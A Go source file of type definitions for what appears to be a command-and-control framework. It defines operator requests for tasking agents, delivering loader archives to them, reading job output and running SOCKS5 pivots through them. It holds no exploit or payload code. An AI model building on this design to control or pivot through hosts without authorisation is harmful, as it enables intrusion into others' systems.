package def

// Operation is a request sent from the operator to the C2 server
type Operation struct {
	AgentTag string  `cbor:"1,keyasint"` // the target agent
	Action   string  `cbor:"2,keyasint"` // the action to perform
	Command  *string `cbor:"3,keyasint"` // the command to send to the agent
	JobID    *string `cbor:"8,keyasint"` // the job ID (if action is "command")
}

// IsOptionSet checks if a specific option is set
func (op *Operation) IsOptionSet(option string) bool {
	switch option {
	case "command":
		return op.Command != nil
	case "job_id":
		return op.JobID != nil
	default:
		return false
	}
}

// SignRequest is the request to sign data
type SignRequest struct {
	Content []byte `cbor:"1,keyasint"` // content to sign (usually UUID)
}

// EnsureCertRequest asks the C2 to add host names to its TLS certificate and
// reload the certificate used by new TLS/QUIC handshakes.
type EnsureCertRequest struct {
	Hosts []string `cbor:"1,keyasint"`
}

// OperatorIdleConfig updates server-side operator-idle settings.
type OperatorIdleConfig struct {
	OperatorIdleTimeout int `cbor:"1,keyasint"` // seconds; 0 disables idle-based rejection
}

// FTPStreamRequest is the request to register an FTP stream
type FTPStreamRequest struct {
	Token        string `cbor:"1,keyasint"`
	FilePath     string `cbor:"2,keyasint"`
	ExpectedSize int64  `cbor:"3,keyasint"`
	Checksum     string `cbor:"4,keyasint"`
}

// WWWDownloadRequest registers one operator-hosted file that a specific agent
// may fetch over the www route.
type WWWDownloadRequest struct {
	Name         string `cbor:"1,keyasint"`
	AgentUUID    string `cbor:"2,keyasint"`
	ExpectedSize int64  `cbor:"3,keyasint"`
	Checksum     string `cbor:"4,keyasint"`
	// Transient marks a one-shot copy made for a single transfer: the
	// registration is consumed by the first fetch. A module or loader archive
	// is registered persistently so a retry can fetch it again.
	Transient bool `cbor:"5,keyasint,omitempty"`
}

// Socks5ProxyRequest is the payload used to start/stop a C2-resident SOCKS5
// pivot. The listener accepts operator (WireGuard/VPN) traffic on the C2 host
// and relays every connection through the bound agent via a dedicated C2 stream.
type Socks5ProxyRequest struct {
	AgentTag string `cbor:"1,keyasint"` // relay target agent (start only)
	Port     int    `cbor:"2,keyasint"` // C2 listener port
	BindAddr string `cbor:"3,keyasint"` // C2 bind address; empty = all interfaces
}

// Socks5ProxyStatus describes one running C2-side SOCKS5 pivot.
type Socks5ProxyStatus struct {
	Port     int    `cbor:"1,keyasint"` // C2 listener port
	AgentTag string `cbor:"2,keyasint"` // agent the pivot relays through
	BindAddr string `cbor:"3,keyasint"` // C2 bind address
}

// JobOutputRequest asks the C2 for a bounded slice of a job's persisted
// output. The caller must own the job.
type JobOutputRequest struct {
	JobID  string `cbor:"1,keyasint"`
	Offset int64  `cbor:"2,keyasint"` // byte offset; ignored when Tail is set
	Limit  int64  `cbor:"3,keyasint"` // maximum bytes
	Tail   bool   `cbor:"4,keyasint"` // return the last Limit bytes
}

// JobOutputResponse is one slice of a job log.
type JobOutputResponse struct {
	JobID     string `cbor:"1,keyasint"`
	Output    string `cbor:"2,keyasint"`
	Size      int64  `cbor:"3,keyasint"`
	Truncated bool   `cbor:"4,keyasint"`
}
